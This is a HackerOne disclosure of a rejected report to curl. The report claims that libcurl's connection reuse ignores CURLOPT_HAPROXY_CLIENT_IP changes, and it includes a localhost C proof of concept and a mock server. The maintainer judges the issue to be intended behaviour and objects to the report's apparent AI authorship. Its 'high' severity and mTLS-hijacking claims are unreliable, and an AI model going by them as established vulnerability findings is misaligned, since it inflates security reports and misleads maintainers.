---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-access-control-generic
  - env/web
substate: "not-applicable"
weakness: "Improper Access Control - Generic"
enriched: true
body: true
date: 2025-12-23
submitted: 2025-12-22T19:14:51.333Z
bounty_usd: null
votes: 16
cve: []
program: "[[programs/curl|curl]]"
reporter: "anonymous_237"
source: "https://hackerone.com/reports/3475613"
title: "HAProxy Connection Reuse leads to IP Spoofing and mTLS Context Smuggling"
---
# HAProxy Connection Reuse leads to IP Spoofing and mTLS Context Smuggling

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 16 | **Program:** curl | **Disclosed:** 2025-12-23

- Report: [https://hackerone.com/reports/3475613](https://hackerone.com/reports/3475613)
- CWE: Improper Access Control - Generic
- Submitted: 2025-12-22T19:14:51.333Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

##Executive Summary

`libcurl` fails to respect the `CURLOPT_HAPROXY_CLIENT_IP` configuration when reusing existing connections. Due to a missing check in the connection pooling logic, `libcurl` indiscriminately reuses a TCP/TLS connection established with a specific identity (IP A) for subsequent requests requiring a different identity (IP B).

Since the HAProxy PROXY protocol header is immutable and only sent during the initial connection handshake, the upstream server attributes the new request to the **previous identity**. This allows a low-privileged request to tunnel through a connection established by a high-privileged user, bypassing IP-based ACLs and inheriting the authenticated mTLS context of the previous session.

## Technical Root Cause Analysis
The vulnerability stems from an architectural omission introduced when `CURLOPT_HAPROXY_CLIENT_IP` was added in version 8.2.0.

1.  **Missing State Storage (`lib/urldata.h`):** The `struct connectdata` (which represents an active connection) does not store the `haproxy_client_ip` used at creation time. The identity information is ephemeral and lost immediately after the handshake.
2.  **Defective Matching Logic (`lib/url.c`):** The `ConnectionExists()` function checks for host, port, protocol, and credentials (username/password) matches but **ignores** `CURLOPT_HAPROXY_CLIENT_IP`. Since the connection structure doesn't hold the old value, a comparison is impossible in the current architecture.
3.  **Violation of API Contract:** The documentation states the IP is sent "at the beginning of the connection". By reusing a connection where the header was already sent with a different value, `libcurl` violates this contract.


##Affected version

curl -V
WARNING: this libcurl is Debug-enabled, do not use in production

curl 8.18.0-DEV (x86_64-pc-linux-gnu) libcurl/8.18.0-DEV wolfSSL/5.8.4 libidn2/2.3.3 libpsl/0.21.2 ngtcp2/1.19.0-DEV nghttp3/1.1
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt pop3 pop3s rtsp smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS Debug HSTS HTTP3 HTTPS-proxy IDN IPv6 Largefile PSL SSL threadsafe TrackMemory UnixSockets


 cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"


## Proof of Concept 

### A. The Vulnerable Client (`poc.c`)
*Compile with:* `gcc -o poc poc.c -lcurl`

```c

#include <stdio.h>
#include <curl/curl.h>
#include <unistd.h>

int main(void) {
  CURL *curl;
  CURLcode res;

  curl_global_init(CURL_GLOBAL_ALL);
  curl = curl_easy_init();

  if(curl) {
    printf("--- PoC: CRITICAL IDENTITY HIJACKING ---\n");

    // Configuration Commune
    curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8080/");
    curl_easy_setopt(curl, CURLOPT_HAPROXYPROTOCOL, 1L);
    curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L); // Force Reuse
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);

    // --- PHASE 1 : TRANSACTION ADMIN ---
    printf("\n[STEP 1] Executing ADMIN Transaction (IP: 10.0.0.1)...\n");
    curl_easy_setopt(curl, CURLOPT_HAPROXY_CLIENT_IP, "10.0.0.1");
    
    res = curl_easy_perform(curl);
    if(res == CURLE_OK) printf("-> Admin Request Sent.\n");

    // Petite pause pour bien séparer les logs visuellement
    sleep(1);

    // --- PHASE 2 : TRANSACTION GUEST (L'ATTAQUE) ---
    printf("\n[STEP 2] Executing GUEST Transaction (IP: 66.66.66.66)...\n");
    printf("EXPECTED: New Connection with Identity 66.66.66.66\n");
    printf("ACTUAL:   Reuse Connection with Identity 10.0.0.1 (PRIVILEGE ESCALATION)\n");
    
    // Changement d'identité : CELA DEVRAIT FORCER UNE NOUVELLE CONNEXION
    curl_easy_setopt(curl, CURLOPT_HAPROXY_CLIENT_IP, "66.66.66.66");
    
    res = curl_easy_perform(curl);
    if(res == CURLE_OK) printf("-> Guest Request Sent.\n");

    curl_easy_cleanup(curl);
  }
  curl_global_cleanup();
  return 0;
}

```

### B. The Victim Server 


```python

#!/usr/bin/env python3
import socket
import sys
import time

# Configuration
HOST = '127.0.0.1'
PORT = 8080

def start_server():
    print(f"[*] BANK BACKEND listening on {HOST}:{PORT}")
    print("[*] Waiting for HAProxy connections...")
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)

    try:
        while True:
            client_sock, addr = server_socket.accept()
            print(f"\n[+] NEW SECURE CHANNEL OPENED from {addr}")
            
            # Identité de la connexion (Liée au socket TCP)
            current_identity = "UNKNOWN"
            
            with client_sock:
                # Lecture initiale (Handshake)
                data = client_sock.recv(4096).decode('utf-8', errors='ignore')
                
                # Parsing de l'identité HAProxy (PROXY TCP4 IP_SRC ...)
                if data.startswith('PROXY'):
                    parts = data.split(' ')
                    if len(parts) > 2:
                        current_identity = parts[2] # L'IP source
                        print(f"    [SECURITY] PROXY HEADER RECEIVED. IDENTITY LOCKED: {current_identity}")
                        
                        # Simulation ACL
                        if current_identity == "10.0.0.1":
                            print("    [ACL] ROLE: ADMIN (High Privilege)")
                        else:
                            print("    [ACL] ROLE: GUEST (Low Privilege)")
                
                # Réponse à la 1ère requête
                response = "HTTP/1.1 200 OK\r\nContent-Length: 5\r\nConnection: keep-alive\r\n\r\nDONE\n"
                client_sock.sendall(response.encode())

                # --- LA FAILLE : RÉUTILISATION ---
                # On attend une 2ème requête sur le MÊME canal
                client_sock.settimeout(2.0)
                try:
                    while True:
                        data = client_sock.recv(4096)
                        if not data: break
                        
                        print(f"\n    [!!!] NEW REQUEST RECEIVED ON EXISTING CHANNEL")
                        print(f"    [!!!] CRITICAL: REUSING LOCKED IDENTITY: {current_identity}")
                        
                        if current_identity == "10.0.0.1":
                            print("    [ACCESS CONTROL] ACTION AUTHORIZED (Inherited Admin Privileges)")
                        else:
                            print("    [ACCESS CONTROL] ACTION DENIED")
                            
                        client_sock.sendall(response.encode())
                except socket.timeout:
                    print("    [-] Connection idle.")

    except KeyboardInterrupt:
        print("\n[*] Stopping server.")
    finally:
        server_socket.close()

if __name__ == '__main__':
    start_server()

```
output : 

```
 python3 bank_server.py 
[*] BANK BACKEND listening on 127.0.0.1:8080
[*] Waiting for HAProxy connections...

[+] NEW SECURE CHANNEL OPENED from ('127.0.0.1', 45200)
    [SECURITY] PROXY HEADER RECEIVED. IDENTITY LOCKED: 10.0.0.1
    [ACL] ROLE: ADMIN (High Privilege)

    [!!!] NEW REQUEST RECEIVED ON EXISTING CHANNEL
    [!!!] CRITICAL: REUSING LOCKED IDENTITY: 10.0.0.1
    [ACCESS CONTROL] ACTION AUTHORIZED (Inherited Admin Privileges)
```

## Impact

## Impact

**1. IP-Based Access Control Bypass (ACLs)**

**2. mTLS Context Smuggling **
In architectures using Mutual TLS (mTLS), the client identity is bound to the underlying TCP/TLS connection.
If `libcurl` reuses a connection established with a high-privileged Client Certificate (e.g., Admin) for a subsequent request intended for a low-privileged context (e.g., Guest), the second request **inherits the authenticated TLS context** of the first. This allows a low-privileged user to tunnel requests through an authenticated session, effectively hijacking the previous user's identity.

**3. Audit Trail Corruption**
Security logs on the upstream server will incorrectly attribute malicious or unauthorized actions to the identity of the initial connection owner. 

**4. Violation of API Contract**
Users explicitly setting `CURLOPT_HAPROXY_CLIENT_IP` expect `libcurl` to present that specific identity to the server. Ignoring this parameter during connection reuse silently violates the security expectations of the application developer.

## Timeline

- **Report Filed**
- **2025-12-22** @bagder: Please stop the AI use. It is tiresome.
- **2025-12-22** @bagder: > attributes the new request to the previous identity

Can you please refer to an application that uses the haproxy functionality this way? Claiming this is a **severity high** vulnerability seems to imply that there are (several) applications using this "identity switching" with the HAproxy protocol and for which this is a vital property.

Seeing their use of this will help us assess this issue and understand its implications better.
- **2025-12-22** @bagder: I don't think this is a security vulnerability. I think this is functionality working as intended.

I'm proposing we clarify this with an amendment to the documentation:

https://github.com/curl/curl/pull/20075
- **2025-12-23** @anonymous_237: 1. If USERNAME changes, libcurl rejects reuse ;  if SSL_CTX changes, libcurl rejects reuse ;   If  CURLOPT_HAPROXY_CLIENT_IP  , libcurl accept reuse     . Why does libcurl accept reuse when CURLOPT_HAPROXY_CLIENT_IP  changes?  Why this distinction?


2. CVE-2023-27535 caused Curl to reuse an existing connection even if the CURLOPT_FTP_ACCOUNT option changed, sending the wrong identity information. CURLOPT_HAPROXY_CLIENT_IP allows the source IP address to change. Curl reuses an existing connection even if this option changes, sending the wrong identity to the server.  https://curl.se/docs/CVE-2023-27535.html
I think these are two very similar reuse vulnerabilities .  Why is one fixed and the other documented?


3. The official documentation says this:   **"Using this option multiple times makes the last set string override the previous ones." **   
I think this is not true with the current code because if a connection is reused, even if you call the option 10 times with different IPs, it is always the first IP that is active on the network.  : https://curl.se/libcurl/c/CURLOPT_HAPROXY_CLIENT_IP.html


4. I think to fix this we can create a variable called `haproxy_client_ip` and copy it into the `connectdata` structure. During the connection, we can simply check if the variable has changed to avoid reuse.
- **2025-12-23** @bagder: This option is used to provide the actual local IP to the proxy. That IP remains the same during the connection. Users are unlikely to A) change the option at all and even more to B) change the option for different requests. The option is rarely, if ever, used to somehow *impersonate different identities*.

libcurl's behavior is adapted to the expected usage pattern.
- **2025-12-23** @anonymous_237: You say that: **"This option is used to provide the actual local IP to the proxy"**, but why not use `getsockname()`, which does indeed retrieve the real local IP address?      With this, libcurl wouldn't need the user to provide a string (character *), and this string would be retrieved in `data->set.str[STRING_HAPROXY_CLIENT_IP]` without checking if this IP corresponds to the real local IP. Therefore, the code is designed to accept any valid IP address.


I think that CURLOPT_INTERFACE is used to specify the local network interface (like an IP address), based on the documentation: https://curl.se/libcurl/c/CURLOPT_INTERFACE.html .
So if CURLOPT_HAPROXY_CLIENT_IP was only used to **"provide the real local IP address"**, then this option would be redundant and useless, because CURLOPT_INTERFACE already does that and has existed since version 7.3 unlike CURLOPT_HAPROXY_CLIENT_IP which was added in version 8.2.0.
- **Report Not Applicable**
- **Agreed On Going Public**
- **2025-12-23** @anonymous_237: Okay, I'll start writing all my reports myself and no longer just take parts or ideas from AI, but use the documentation.

I think the report should be classified as informative and not applicable because it improves the documentation of `CURLOPT_HAPROXY_CLIENT_IP` by highlighting a previously undocumented behavior.

You can close it and make it public.
- **2025-12-23** @anonymous_237: Thanks for the advice.
- **Manually Disclosed**
